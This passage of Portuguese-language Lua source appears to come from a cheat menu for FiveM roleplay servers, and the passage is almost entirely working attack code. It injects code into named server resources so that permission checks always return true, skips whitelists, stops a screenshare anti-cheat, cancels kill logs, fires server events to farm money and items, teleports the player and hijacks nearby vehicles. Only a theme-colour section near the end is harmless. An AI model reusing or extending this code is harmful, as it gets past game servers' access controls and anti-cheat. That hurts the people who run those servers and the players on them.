                        next.elements.checkbox("Puxar Minerio", "wddwdwdwdwdafsadaadfassf", function()
                            while next.values.checkbox["mineriosfluxo"] do
                                FrameAPI.Inject('core', [[
                                    vMINER.checkPayment(GetNetworkTime())
                                ]])
                                Wait(next.values.slider["DELAYMINERIO"] * 1000)
                            end
                        end)
elseif city == "Cidade Bella" then
  next.elements.checkbox("Farmar Dinheiro", "farm_money", function()
    nt.createTh(function()
    while next.values.checkbox["farm_money"] do
    local code = json.decode('["giveRouteItems",["frutas",true],"cellao_rotas",0,{"ev":"RKG_Rotas:tunnel_req","plv":"UVSBO5Q7WZ","rs":"cellao_rotas","tipl":"cellao_rotas:2"}]')
    TriggerServerEvent('RKG_Rotas:tunnel_req', table.unpack(code))
    Wait(4000)
    end
    end)
    end)
                            elseif group == "Fusion Group" then
                            next.elements.button("Remover logs de kill", "wddwdwdwdwd", function()
                                AddEventHandler('dk:kill', function(killerid, data)
                                    CancelEvent()
                                end)
                            end)
                            next.elements.button("Liberar acesso as garagens", "liberaracessogaragensdwdw", function()
                            if GetResourceState('fusion_pvp') == 'started' then
                                local resource
                                if GetResourceState("metropole_garages") == 'started' then
                                    resource = "metropole_garages"
                                elseif GetResourceState("visao_garages") == 'started' then
                                    resource = "visao_garages"
                                elseif GetResourceState("revoada_garages") == 'started' then
                                    resource = "revoada_garages"
                                elseif GetResourceState("bahamas_garages") == 'started' then
                                    resource = "bahamas_garages"
                                elseif GetResourceState("complexo_garages") == 'started' then
                                    resource = "complexo_garages"
                                elseif GetResourceState("balneario_garages") == 'started' then
                                    resource = "balneario_garages"
                                end
                                local code = [[
                                    vTunnelGarages.hasHomePermission = function()
                                        return true
                                    end
                                    vTunnelGarages.checkPermission = function()
                                        return true
                                    end
                                ]]
                                FrameAPI.Inject(resource, code)
                            end
                            end)
                            next.elements.button("Liberar acesso as casas", "liberarcasasacesso", function()
                            local code = [[
                                vSERVER.checkEnterHouse = function()
                                    return true
                                end
                                vSERVER.checkOpenPermission = function()
                                    return true
                                end
                                vSERVER._getBau = function()
                                    return true
                                end
                            ]]
                            FrameAPI.Inject("mirtin_homes", code)
                            end)
                            if city == "Revoada RJ" then
                            next.elements.button("Virar Mecanico", "virarmecrevo", function()
                                    FrameAPI.Inject('revoada_bennys', [[
    Tunnel = module('lib/Tunnel')
    API = Tunnel.getInterface('bennys')
    API.hasPermission = function()
    return true
    end
    ]])
                            end)
                        end
                        if city == "Complexo RJ" then
                            next.elements.button("Virar Mecanico", "virarmeccomplexo", function()
                                    FrameAPI.Inject('complexo_bennys', [[
    Tunnel = module('lib/Tunnel')
    API = Tunnel.getInterface('bennys')
    API.hasPermission = function()
    return true
    end
    ]])
                            end)
                                                        next.elements.button("Sair da Sessão Solo", "sairsolosessioncomplexo", function()
                                    FrameAPI.Inject('complexo_char', [[
    local original_setRoutingBucket = Remote._setRoutingBucket
    function Remote._setRoutingBucket(state)
    if state == true then
    return
    else
    return original_setRoutingBucket(state)
    end
    end
    nextTh.createTh(function()
    while true do
    Wait(0)
    original_setRoutingBucket(false)
    end
    end)
    ]])
                            end)
                        end
                        if city == "Bahamas" then
                            next.elements.button("Virar Mecanico", "virarmecbahamas", function()
                                    FrameAPI.Inject('bahamas_bennys', [[
    Tunnel = module('lib/Tunnel')
    API = Tunnel.getInterface('bennys')
    API.hasPermission = function()
    return true
    end
    ]])
                            end)
                                                        next.elements.button("Sair da Sessão Solo", "sairsolosessionbahamas", function()
    FrameAPI.Inject('bahamas_char', [[
    local original_setRoutingBucket = Remote._setRoutingBucket
    function Remote._setRoutingBucket(state)
    if state == true then
    return
    else
    return original_setRoutingBucket(state)
    end
    end
    nextTh.createTh(function()
    while true do
    Wait(0)
    original_setRoutingBucket(false)
    end
    end)
    ]])
                            end)
                        end
                        if city == "Revoada RJ" then
                        next.elements.button("Sair da Sessão Solo", "sairsolosessionrevo", function()
                                FrameAPI.Inject('revoada_char', [[
    local original_setRoutingBucket = Remote._setRoutingBucket
    function Remote._setRoutingBucket(state)
    if state == true then
    return
    else
    return original_setRoutingBucket(state)
    end
    end
    nextTh.createTh(function()
    while true do
    Wait(0)
    original_setRoutingBucket(false)
    end
    end)
    ]])
                        end)
                    end
                            next.elements.button("Abrir Blip de farm", "blipfarm", function()
                            local code = [[
                                SendNUIMessage({ action = 'setVisible', data = {
                                    isVisible = true,
                                    changeStorage = changeStorage
                                } })
                                SetNuiFocus(true, true)
                            ]]
                            FrameAPI.Inject('mirtin_craft_v2', code)
                            end)
                            next.elements.button("Não morrer ao matar", "naomorreraomatar", function()
                                nt.createTh(function()
                                    FrameAPI.Inject("vrp_safezone", [[
                                        function _G.vSERVER.checkPermission()
                                            return true
                                        end
                                    ]])
                                    next.elements.notify("Sucesso!", 'success')
                                end)
                            end)
                        end
 if group == "Lotus Group" then

    next.elements.button("Test Perm", "sairdaprissdsfsdao", function()
    FrameAPI.Inject('vrp_admin', [[
    LocalPlayer.state.paulinho = true
    vSERVER.getPermissao = function(perm)
    return true
    end
    ]])
    FrameAPI.Inject('mirtin_survival_v3', [[
    getUsersByPermission = function(perm)
    return true
    end
    ]])
    end)

    next.elements.checkbox("Noclip adm", "nclotus", function()
    FrameAPI.Inject('vrp', [[
    tvRP.toggleNoclip()
    ]])
    end)
    next.elements.button("Virar Mecanico", "viramec", function()
    FrameAPI.Inject('lscustoms', [[
    vSERVER.Permission = function(perm)
    return true
    end
    ]])
    end)
                                next.elements.button("Tirar Tela de Telagem", "telegem", function()
                                next.functions['stop_resource']('spreadst_screenshare')
                            end)
    next.elements.button("Sair da Prissão", "sairdaprissao", function()
        TriggerEvent("prisaoADM", false)
    end)
next.elements.checkbox("Farm Dinheiro Sujo", "dinheiro_sujo_lotus", function(state)
    if state then
        nt.createTh(function()
            local locations = {
                { coords = vector3(24.50034, -1347.34, 29.4938), ids = {1, 2} },
                { coords = vector3(2557.23, 380.8302, 108.6211), ids = {3, 4} },
                { coords = vector3(-47.96019, -1759.34, 29.42035), ids = {8, 9} },
                { coords = vector3(-3242.24, 1000.01, 12.83022), ids = {12, 13} },
                { coords = vector3(549.3567, 2669.611, 42.15649), ids = {16, 17} },
                { coords = vector3(1960.12, 3740.01, 32.34112), ids = {19, 18} },
                { coords = vector3(2678.07, 3279.42, 55.24044), ids = {20, 21} },
                { coords = vector3(1727.88, 6415.21, 35.03303), ids = {14, 15} },
                { coords = vector3(-3038.95, 584.55, 7.904026), ids = {28, 29} },
                { coords = vector3(1134.249, -982.4702, 46.41238), ids = {30} },
                { coords = vector3(-1221.989, -908.2909, 12.3231), ids = {33} },
                { coords = vector3(-2966.44, 390.89, 15.04121), ids = {27} },
                { coords = vector3(1165.93, 2710.77, 38.15252), ids = {31} },
                { coords = vector3(-1486.29, -378.0201, 40.16261), ids = {32} },
                { coords = vector3(-1818.89, 792.9399, 138.0806), ids = {24, 25} },
                { coords = vector3(1696.57, 4923.95, 42.06141), ids = {22, 23} },
                { coords = vector3(372.5803, 326.39, 103.5625), ids = {11, 10} },
            }
            while next.vars["dinheiro_sujo_lotus"] do
                for _, loc in ipairs(locations) do
                    if not next.vars["dinheiro_sujo_lotus"] then break end
                    local x, y, z = loc.coords.x, loc.coords.y, loc.coords.z
                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        ped = GetVehiclePedIsUsing(ped)
                    end
                    local startZ = z - 10.0
                    local endZ = z + 1.0
                    SetEntityCoordsNoOffset(ped, x, y, startZ, 0, 0, 1)
                    Wait(300)
                    for currentZ = startZ, endZ, 0.5 do
                        SetEntityCoordsNoOffset(ped, x, y, currentZ, 0, 0, 1)
                        Wait(30)
                    end
                    Wait(300)
                    FrameAPI.ForceKeyPress(0xA1)
                    Wait(17000)
                end
            end
        end)
    end
end)
next.elements.button("Abrir Lojinha", "abrir_lojinha", function()
    TriggerServerEvent("inventory:tunnel_req", "getInventory", {}, "inventory", 0)
    TriggerServerEvent('inventory:tunnel_req', 'getProfile', {}, 'inventory', 0)
end)
next.elements.button("Comprar Celular Custo: 5000", "comprar_celular", function()
    nt.createTh(function()
        local code = json.decode('["shopAction",["Mercado","celular",1,"13"],"inventory",0]')
        TriggerServerEvent('inventory:tunnel_req', table.unpack(code))
    end)
end)
next.elements.button("Comprar Rádio Custo: 5000", "comprar_radio", function()
    nt.createTh(function()
        local code = json.decode('["shopAction",["Mercado","radio",1,"14"],"inventory",0]')
        TriggerServerEvent('inventory:tunnel_req', table.unpack(code))
    end)
end)
next.elements.button("Comprar Mochila Custo: 9000", "comprar_mochila", function()
    nt.createTh(function()
        local code = json.decode('["shopAction",["Mercado","mochila",1,"15"],"inventory",0]')
        TriggerServerEvent('inventory:tunnel_req', table.unpack(code))
    end)
end)
next.elements.button("Comprar Roupas Custo: 20000", "comprar_roupas", function()
    nt.createTh(function()
        local code = json.decode('["shopAction",["Mercado","roupas",1,"20"],"inventory",0]')
        TriggerServerEvent('inventory:tunnel_req', table.unpack(code))
    end)
end)
end
                        next.elements.groupbox("Exploits Universais", "uni", "\xef\x82\xac", 305, 0, 270, 280)
 next.elements.checkbox("Anti Crash", "anticrash_protection", function(bool)
    if bool then
        nt.createTh(function()
            while next.values.checkbox["anticrash_protection"] do
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                for _, ped in ipairs(GetGamePool('CPed')) do
                    if DoesEntityExist(ped) and ped ~= playerPed and not IsPedAPlayer(ped) then
                        local pedCoords = GetEntityCoords(ped)
                        local dist = #(playerCoords - pedCoords)
                        if dist <= 500.0 then
                            SetEntityAsMissionEntity(ped, true, true)
                            DeleteEntity(ped)
                        end
                    end
                end
                for _, obj in ipairs(GetGamePool('CObject')) do
                    if DoesEntityExist(obj) then
                        local objCoords = GetEntityCoords(obj)
                        local dist = #(playerCoords - objCoords)
                        if dist <= 500.0 then
                            if not IsEntityAttachedToEntity(obj, playerPed) then
                                SetEntityAsMissionEntity(obj, true, true)
                                DeleteObject(obj)
                            end
                        end
                    end
                end
                RemoveParticleFxInRange(playerCoords.x, playerCoords.y, playerCoords.z, 500.0)
                Wait(150)
            end
        end)
    else
    end
end)
                        next.elements.button("Pular WL", "pular_whitelist", function()
                            if city == "Crush" then
                                FrameAPI.StopResource('crush-wl')
                                FreezeEntityPosition(PlayerPedId(), false)
                            elseif city == "Sakura RP" or city == "Dz7rp" then
                               FrameAPI.Inject("InitialGarty", [[
                                 TriggerEvent("initialGarty:closeUi")
                                 callback(true)
                                 server.initialCompleteSteps(data.data)
                                 SendNUIMessage({ type = 'comWhitelist' })]])
                            elseif city == "Brooklyn Rp" then
                                FrameAPI.StopResource('skip-whitelist')
                                TriggerScreenblurFadeOut(1000)
                                FreezeEntityPosition(PlayerPedId(), false)
                            elseif city == "Atlanta Rj" then
                                FrameAPI.StopResource('new_login')
                                SetNuiFocus(false, false)
                                TransitionFromBlurred(1000)
                            elseif city == "Wolf Side" then
                                FrameAPI.Inject('wolf-register', [[
                                SetRoute("/complete")
                                Wait(1000)
                                local Ped = PlayerPedId()
                                SetNuiFocus(false,false)
                                TransitionFromBlurred(1000)
                                SendNUIMessage({ action = "setVisible", data = false })
                                TriggerEvent("hud:Active",true)
                                FreezeEntityPosition(Ped,false)
                                SetEntityVisible(Ped,true,false)
                                InRegister = false
                                ]])
                            elseif city == "Euforia RP" then
                                FrameAPI.StopResource('InitialGarty')
                            elseif city == "Goias Rp" then
                                FrameAPI.StopResource('jhones_wl')
                            elseif city == "Abcd Rp" then
                                FrameAPI.StopResource('abcd_register')
                            elseif city == "FiveZ" then
                                FrameAPI.StopResource('five_login')
                            elseif city == "Dallas" then
                                FrameAPI.Inject('dallas_whitelist', [[
                                vSERVER.CheckWhitelist = function() return true end
                                ]])
                            elseif city == "Cidade Bella" then
                                FrameAPI.StopResource('whitelist')
                                 SetNuiFocus(false, false)
		                         SendNUIMessage({type = 'closeUi'})
		                         TriggerScreenblurFadeOut(1000)
                            elseif city == "Hunters Rp" then
                                FrameAPI.Inject('new_login', [[
                                    vSERVER.requestWhitelist = function() return true end
                                ]])
                            elseif city == "Filadelfia Rp" then
                                FrameAPI.StopResource('characters')
                            elseif group == "Space Group" then
                                FrameAPI.Inject('space-module', [[
                                    RegisterNUICallback('CONFIRM_USER_WHITELIST', function(data, callback)
                                        whitelistScreenOpen = false
                                        TriggerEvent('Notify', 'sucesso', 'Acesso liberado com sucesso!')
                                        TriggerEvent("hudActived", true)
                                        SetNuiFocus(false, false)
                                        SetNuiFocusKeepInput(false)
                                        TriggerEvent("bonusSelector:open")
                                        EnableAllControlActions(0)
                                        EnableAllControlActions(1)
                                        EnableAllControlActions(2)
                                        LocalPlayer.state:set('whitelisted', true, true)
                                        callback('success')
                                    end)
                                ]])
                                next.elements.notify("Clique para avançar!", "sucesso")
                                Wait(2000)
                                FrameAPI.StopResource('space-module')
                            else
                                next.elements.notify("Cidade sem suporte!")
                            end
                        end)
                        next.elements.input("Numero da Radio", "numerodaradio", "")
                next.elements.button("Entrar na Radio", "entrarradio", function()
                    local radio =  next.values.input["numerodaradio"]
                    FrameAPI.Inject('pma-voice', string.format([[
                    local radio = %s
                    exports['pma-voice']:setRadioChannel(radio)
                    ]], radio))
                    end)
                    if group == "Lotus Group" then
                        next.elements.button("Se Desmutar", "desmutar", function()
                            FrameAPI.Inject('pma-voice', [[ exports('DesmutePlayer', DesmutePlayer) ]])
                            LocalPlayer.state.Muted = false
                        end)
                    end
                        next.elements.checkbox("Bypass Safezone", "safeBypass", function()
                            nt.createTh(function()
                                while next.values.checkbox["safeBypass"] do
                                    NetworkSetFriendlyFireOption(true)
                                    SetCanAttackFriendly(PlayerPedId(), true, true)
                                    DisablePlayerFiring(PlayerPedId(), false)
                                    EnableAllControlActions(0)
                                    EnableAllControlActions(1)
                                    Wait(1)
                                end
                            end)
                        end)
                        next.elements.checkbox("Deletar Entidades", "deleteEntities", function()
                            nt.createTh(function()
                                while next.values.checkbox["deleteEntities"] do
                                    local tipos = { 'CPed', 'CVehicle', 'CObject' }
                                    for _, type in ipairs(tipos) do
                                        for _, entity in ipairs(GetGamePool(type)) do
                                            if NetworkGetEntityOwner(entity) == PlayerId() then
                                                SetEntityAsMissionEntity(entity, true, true)
                                                DeleteEntity(entity)
                                                DeleteVehicle(entity)
                                                DeletePed(entity)
                                                DeleteObject(entity)
                                            end
                                        end
                                    end
                                    Wait(1)
                                end
                            end)
                        end)
local veiculosPreparados = {}
next.elements.button("Preparar Veículos", "btn_prep_vehs", function()
    local controlledVehicles = {}
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local originalCoords = playerCoords
    local vehicles = GetGamePool('CVehicle')
    local count = 0
    local veiculosUtilizaveis = {}
    for i = 1, math.min(#vehicles, 500) do
        local vehicle = vehicles[i]
        if DoesEntityExist(vehicle) and IsVehicleSeatFree(vehicle, -1) then
            local vehicleCoords = GetEntityCoords(vehicle)
            local distancia = #(playerCoords - vehicleCoords)
            if distancia <= 500.0 then
                local engineHealth = GetVehicleEngineHealth(vehicle)
                if engineHealth > 500.0 then
                    table.insert(veiculosUtilizaveis, vehicle)
                end
            end
        end
        Wait(0)
    end
    for _, vehicle in ipairs(veiculosUtilizaveis) do
        local vehicleCoords = GetEntityCoords(vehicle)
        SetEntityCoords(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 2.0, false, false, false, false)
        SetVehicleDoorsLocked(vehicle, 1)
        SetVehicleDoorsLockedForAllPlayers(vehicle, false)
        NetworkRequestControlOfEntity(vehicle)
        Wait(10)
        if NetworkHasControlOfEntity(vehicle) then
            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
            Wait(100)
            if GetVehiclePedIsIn(playerPed, false) == vehicle then
                local vehData = {
                    handle = vehicle,
                    hash = GetEntityModel(vehicle),
                    name = GetDisplayNameFromVehicleModel(GetEntityModel(vehicle))
                }
                table.insert(controlledVehicles, vehData)
                count = count + 1
            end
        end
        Wait(0)
    end
    SetEntityCoordsNoOffset(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
    veiculosPreparados = controlledVehicles
    next.elements.notify("Preparados "..count.." veículos!", "success")
end)
                        next.elements.button("Abrir Portões Trancados", "open_gates", function()
                            nt.createTh(function()
                            local doorModels = {
                            GetHashKey("prop_int_gate01"),
                            GetHashKey("p_gate_prison_01_s"),
                            GetHashKey("p_sec_gate_01_s_col"),
                            GetHashKey("p_sec_gate_01_s"),
                            GetHashKey("prop_fnclink_02gate7"),
                            GetHashKey("prop_fnclink_07gate3"),
                            GetHashKey("prop_fnclink_06gatepost"),
                            GetHashKey("prop_fnclink_07gate1"),
                            GetHashKey("prop_fnclink_03gate2"),
                            GetHashKey("prop_fnclink_02gate2"),
                            GetHashKey("prop_fnclink_02gate1"),
                            GetHashKey("prop_fnclink_02gate5"),
                            GetHashKey("prop_fnclink_02gate3"),
                            GetHashKey("prop_fnclink_02gate6_l"),
                            GetHashKey("prop_fnclink_06gate2"),
                            GetHashKey("prop_fnclink_02gate4"),
                            GetHashKey("prop_fnclink_03gate5"),
                            GetHashKey("prop_fnclink_03gate3"),
                            GetHashKey("prop_fnclink_07gate2"),
                            GetHashKey("02gate3_l"),
                            GetHashKey("prop_fnclink_09gate1"),
                            GetHashKey("prop_gate_bridge_ld"),
                            GetHashKey("prop_fnclink_01gate1"),
                            GetHashKey("prop_fnclink_04gate1"),
                            GetHashKey("prop_fnclink_03gate4"),
                            GetHashKey("prop_fnclink_02gate6"),
                            GetHashKey("prop_fnclink_03gate1"),
                            GetHashKey("prop_fnclink_06gate3"),
                            GetHashKey("prop_fnclink_02gate6_r"),
                            GetHashKey("prop_arm_gate_l"),
                            GetHashKey("prop_facgate_05_r"),
                            GetHashKey("prop_gate_airport_01"),
                            GetHashKey("prop_lrggate_01c_r"),
                            GetHashKey("prop_facgate_03b_r"),
                            GetHashKey("prop_gatecom_02"),
                            GetHashKey("prop_facgate_07b"),
                            GetHashKey("prop_gate_military_01"),
                            GetHashKey("prop_facgate_08"),
                            GetHashKey("prop_lrggate_01_l"),
                            GetHashKey("prop_gate_cult_01_r"),
                            GetHashKey("prop_facgate_03_r"),
                            GetHashKey("prop_gate_frame_05"),
                            GetHashKey("prop_facgate_08_ld"),
                            GetHashKey("prop_gate_frame_06"),
                            GetHashKey("prop_lrggate_03b"),
                            GetHashKey("prop_fncres_07gate"),
                            GetHashKey("prop_lrggate_01c_l"),
                            GetHashKey("prop_fncres_06gater"),
                            GetHashKey("prop_facgate_id1_27"),
                            GetHashKey("prop_facgate_02pole"),
                            GetHashKey("prop_facgate_04_r"),
                            GetHashKey("prop_gate_tep_01_l"),
                            GetHashKey("prop_lrggate_02_ld"),
                            GetHashKey("prop_facgate_03_ld_r"),
                            GetHashKey("prop_gatecom_01"),
                            GetHashKey("prop_facgate_04_l"),
                            GetHashKey("prop_lrggate_03a"),
                            GetHashKey("prop_lrggate_01_pst"),
                            GetHashKey("prop_fncres_08gatel"),
                            GetHashKey("prop_lrggate_03b_ld"),
                            GetHashKey("prop_facgate_08_ld2"),
                            GetHashKey("prop_fncres_06gatel"),
                            GetHashKey("prop_gate_prison_01"),
                            GetHashKey("prop_gate_frame_04"),
                            GetHashKey("prop_armenian_gate"),
                            GetHashKey("prop_facgate_03_l"),
                            GetHashKey("prop_facgate_08_frame"),
                            GetHashKey("prop_lrggate_01b"),
                            GetHashKey("prop_fncsec_01gate"),
                            GetHashKey("prop_fncres_09gate"),
                            GetHashKey("prop_gate_cult_01_l"),
                            GetHashKey("prop_gate_docks_ld"),
                            GetHashKey("prop_gate_farm_01a"),
                            GetHashKey("prop_facgate_02_l"),
                            GetHashKey("prop_facgate_03post"),
                            GetHashKey("prop_fncres_02_gate1"),
                            GetHashKey("prop_lrggate_06a"),
                            GetHashKey("prop_gate_tep_01_r"),
                            GetHashKey("prop_fncwood_07gate1"),
                            GetHashKey("prop_lrggate_04a"),
                            GetHashKey("prop_lrggate_05a"),
                            GetHashKey("prop_fncwood_01gate"),
                            GetHashKey("prop_facgate_05_r_l1"),
                            GetHashKey("prop_lrggate_02"),
                            GetHashKey("prop_facgate_03b_l"),
                            GetHashKey("prop_facgate_01b"),
                            GetHashKey("prop_gate_frame_02"),
                            GetHashKey("prop_gate_farm_post"),
                            GetHashKey("prop_lrggate_01_r"),
                            GetHashKey("prop_gate_farm_03"),
                            GetHashKey("prop_fncres_03gate1"),
                            GetHashKey("prop_gate_frame_01"),
                            GetHashKey("prop_facgate_07"),
                            GetHashKey("prop_facgate_06_r"),
                            GetHashKey("prop_facgate_06_l"),
                            GetHashKey("prop_facgate_03_ld_l"),
                            GetHashKey("prop_facgate_01"),
                            GetHashKey("prop_fncply_01gate"),
                            GetHashKey("prop_facgate_05_r_dam_l1"),
                            GetHashKey("prop_sluicegate"),
                            GetHashKey("prop_sluicegater"),
                            GetHashKey("prop_sluicegatel"),
                            GetHashKey("prop_burto_gate_01"),
                            GetHashKey("prop_sec_gate_01c"),
                            GetHashKey("prop_sec_gate_01b"),
                            GetHashKey("prop_sm_27_gate"),
                            GetHashKey("prop_sc1_06_gate_l"),
                            GetHashKey("prop_sm_27_gate_03"),
                            GetHashKey("prop_bh1_03_gate_l"),
                            GetHashKey("prop_sc1_06_gate_r"),
                            GetHashKey("prop_cs_sc1_11_gate"),
                            GetHashKey("prop_sec_gate_01d"),
                            GetHashKey("prop_sm_27_gate_02"),
                            GetHashKey("prop_bh1_48_gate_1"),
                            GetHashKey("prop_sm_27_gate_04"),
                            GetHashKey("prop_gold_vault_gate_01"),
                            GetHashKey("prop_bh1_03_gate_r"),
                            GetHashKey("prop_cs_sm_27_gate"),
                            GetHashKey("prop_broken_cell_gate_01"),
                            GetHashKey("prop_cs_gravyard_gate_l"),
                            GetHashKey("prop_cs_gravyard_gate_r"),
                            GetHashKey("prop_snow_facgate_01"),
                            GetHashKey("prop_snow_gate_farm_03"),
                            GetHashKey("prop_start_gate_01"),
                            GetHashKey("prop_inflategate_01"),
                            GetHashKey("hei_prop_station_gate"),
                            GetHashKey("hei_v_ilev_bk_gate2_molten"),
                            GetHashKey("hei_v_ilev_bk_gate2_pris"),
                            GetHashKey("hei_v_ilev_bk_gate_molten"),
                            GetHashKey("hei_v_ilev_bk_gate_pris"),
                            GetHashKey("hei_v_ilev_bk_safegate_molten"),
                            GetHashKey("hei_v_ilev_bk_safegate_pris"),
                            GetHashKey("prop_gold_vault_gate_01"),
                            GetHashKey("prop_start_gate_01b"),
                            GetHashKey("v_ilev_bk_gate"),
                            GetHashKey("v_ilev_bk_gate2"),
                            GetHashKey("v_ilev_bk_gatedam"),
                            GetHashKey("v_ilev_bk_safegate"),
                            GetHashKey("v_ilev_cbankvaulgate01"),
                            GetHashKey("v_ilev_cbankvaulgate02"),
                            GetHashKey("v_ilev_fbisecgate"),
                            GetHashKey("v_ilev_fingate"),
                            GetHashKey("v_ilev_ph_cellgate"),
                            GetHashKey("v_ilev_ph_cellgate02"),
                            }
                            while true do
                            local coords = GetEntityCoords(PlayerPedId())
                            for k, v in pairs(doorModels) do
                            local obj = GetClosestObjectOfType(coords.x, coords.y, coords.z, 100.0, v, false, false, false)
                            if obj and obj ~= 0 then
                            SetEntityAsMissionEntity(obj, true, true)
                            FreezeEntityPosition(obj, false)
                            local heading = GetEntityHeading(obj)
                            SetEntityHeading(obj, heading + 90.0)
                            end
                            end
                            Wait(5000)
                            end
                            end)
                            end)
                            next.elements.groupbox("AutoFarm", "farm", "\xef\x82\xac", 0, 300, 270, 135)
                    next.elements.slider("Intervalo de TP (Seg)", "auto_farm_delay", { min = 1, max = 30, start = 1 }, function(bool)
                    end)
next.elements.checkbox("Auto Farm (Teleporte)", "autoFarm", function(bool)
    nt.createTh(function()
        while next.values.checkbox["autoFarm"] do
            local playerPed = PlayerPedId()
            local grp = group
            local isLotus = grp == "Lotus Group"
            local isNoway = grp == "Noway Group"
            local isSanta = grp == "Santa Group"
            local isFusion = grp == "Fusion Group"
            local farm_time = tonumber(next.values.slider["auto_farm_delay"]) or 3000
            if isLotus or isNoway or isSanta or isFusion then
                local spriteAlvo = isFusion and 198 or (isLotus and 433 or 1)
                local coresAlvo = isFusion and {1, 5, 33} or {isLotus and 5 or (isSanta and 5 or 2)}
                local blips = {}
                local blip = GetFirstBlipInfoId(spriteAlvo)
                while DoesBlipExist(blip) do
                    local blipSprite = GetBlipSprite(blip)
                    local blipColor = GetBlipColour(blip)
                    if blipSprite == spriteAlvo then
                        for _, cor in ipairs(coresAlvo) do
                            if blipColor == cor then
                                blips[#blips+1] = blip
                                break
                            end
                        end
                    end
                    blip = GetNextBlipInfoId(spriteAlvo)
                end
                if #blips == 0 then
                    Wait(1000)
                else
                    for _, blip in ipairs(blips) do
                        local x, y, z = table.unpack(GetBlipCoords(blip))
                        local ped = playerPed
                        if IsPedInAnyVehicle(ped) then
                            ped = GetVehiclePedIsUsing(ped)
                        end
                        local startZ = z - 10.0
                        local endZ = z + 1.0
                        SetEntityCoordsNoOffset(ped, x, y, startZ, 0, 0, 1)
                        Wait(300)
                        for currentZ = startZ, endZ, 0.5 do
                            SetEntityCoordsNoOffset(ped, x, y, currentZ, 0, 0, 1)
                            Wait(30)
                        end
                        Wait(farm_time * 1000)
                    end
                end
            else
                local blip = GetFirstBlipInfoId(1)
                if blip ~= 0 then
                    local blipCoords = GetBlipCoords(blip)
                    if IsPedInAnyVehicle(playerPed) then
                        SetEntityCoords(GetVehiclePedIsIn(playerPed), blipCoords)
                    else
                        SetEntityCoords(playerPed, blipCoords)
                    end
                    Wait(math.floor(farm_time / 2))
                    Wait(math.floor(farm_time / 2))
                else
                    Wait(1000)
                end
            end
        end
    end)
end)
next.elements.checkbox("Auto Farm Legit (Dirigir)", "autoFarmLegit", function(bool)
    if next.values.checkbox["autoFarmLegit"] then
    nt.createTh(function()
    while next.values.checkbox["autoFarmLegit"] do
    local blip = GetFirstBlipInfoId(1)
    local found = false
    while next.values.checkbox["autoFarmLegit"] and DoesBlipExist(blip) do
    if GetBlipColour(blip) == 5 then
    found = true
    break
    end
    blip = GetNextBlipInfoId(1)
    end
    if not next.values.checkbox["autoFarmLegit"] then
    break
    end
    if found then
    local ped = PlayerPedId()
    local coords = GetBlipCoords(blip)
    local vehicle = GetVehiclePedIsIn(ped, false)
    if vehicle ~= 0 then
    ClearPedTasks(ped)
    TaskVehicleDriveToCoord(ped, vehicle, coords.x, coords.y, coords.z, 50.0, 156, vehicle, 2883621, 5.5, true)
    SetDriveTaskDrivingStyle(ped, 2883621)
    while next.values.checkbox["autoFarmLegit"] and #(GetEntityCoords(vehicle) - coords) > 10.0 do
    Wait(500)
    end
    if next.values.checkbox["autoFarmLegit"] and FrameAPI and FrameAPI.ForceKeyPress then
    FrameAPI.ForceKeyPress(0x12)
    end
    Wait(3000)
    else
    ClearPedTasks(ped)
    ClearPedTasksImmediately(ped)
    end
    else
    Wait(1000)
    end
    end
    end)
    else
    next.values.checkbox["autoFarmLegit"] = false
    end
end)
next.elements.checkbox("Auto Pressionar E", "autopresse", function(bool)
    if bool then
        nt.createTh(function()
            while next.values.checkbox["autopresse"] do
                if FrameAPI and FrameAPI.ForceKeyPress then
                    FrameAPI.ForceKeyPress(0x12)
                end
                Wait(500)
            end
        end)
    end
end)
next.elements.checkbox("Auto Pressionar G", "autopressg", function(bool)
    if bool then
        nt.createTh(function()
            while next.values.checkbox["autopressg"] do
                if FrameAPI and FrameAPI.ForceKeyPress then
                    FrameAPI.ForceKeyPress(0x22)
                end
                Wait(500)
            end
        end)
    end
end)
                    end
                elseif next.vars.tab_selected == "Temas" then
                    if next.vars.subtab_selected == "Personalização" then
                        next.elements.groupbox("Temas", "temas", "\xef\x82\xac", 0, 0, 545, 440)
                        next.elements.colorpicker("Cor personalizada", "corPers", function()
                            local color = next.values.colorpicker['corPers']
                            next.colors.theme[1] = color.r
                            next.colors.theme[2] = color.g
                            next.colors.theme[3] = color.b
                            next.vars.christmas_mode = false
                            next.vars.snowflakes = {}
                        end, next.colors.theme)
                        next.elements.button("Tema Padrao/Normal", "padrao", function()
                            next.colors.theme = {255, 0, 0}
                            next.vars.christmas_mode = false
                            next.vars.snowflakes = {}
                            next.colors.theme = {255, 0, 0}
                        end)
                        next.elements.button("Menu Verde", "verde", function()
                            next.colors.theme = {0, 240, 0}
                            next.vars.christmas_mode = false
                            next.vars.snowflakes = {}
                        end)
                        next.elements.button("Menu Vermelho", "vermelho", function()
                            next.colors.theme = {240, 0, 0}
                            next.vars.christmas_mode = false
                            next.vars.snowflakes = {}
                        end)
                        next.elements.button("Menu Amarelo", "amarelo", function()
                            next.colors.theme = {240, 240, 0}
                            next.vars.christmas_mode = false
                            next.vars.snowflakes = {}
                        end)
                        next.elements.button("Menu Laranja", "laranja", function()
                            next.colors.theme = {240, 165, 0}
                            next.vars.christmas_mode = false
                            next.vars.snowflakes = {}
                        end)
                        next.elements.button("Menu Rosa", "rosa", function()
                            next.colors.theme = {240, 0, 240}
                            next.vars.christmas_mode = false
                            next.vars.snowflakes = {}
                        end)
                        next.elements.button("Tema Natalino", "btn_natal", function()
    if next.vars.christmas_mode then
        return
    end
    next.vars.christmas_mode = true
    next.colors.theme = {220, 20, 60}
    nt.createTh(function()
        while next.vars.christmas_mode do
            local menuX = next.x
            local menuY = next.y
            local menuW = next.w
            local menuH = next.h
            if next.active and next.render then
                if next.vars.prev_menuX == 0 then
                    next.vars.prev_menuX = menuX
                    next.vars.prev_menuY = menuY
                end
                local deltaX = menuX - next.vars.prev_menuX
                local deltaY = menuY - next.vars.prev_menuY
                if deltaX ~= 0 or deltaY ~= 0 then
                    for i, flake in ipairs(next.vars.snowflakes) do
                        flake.x = flake.x + deltaX
                        flake.y = flake.y + deltaY
                    end
                end
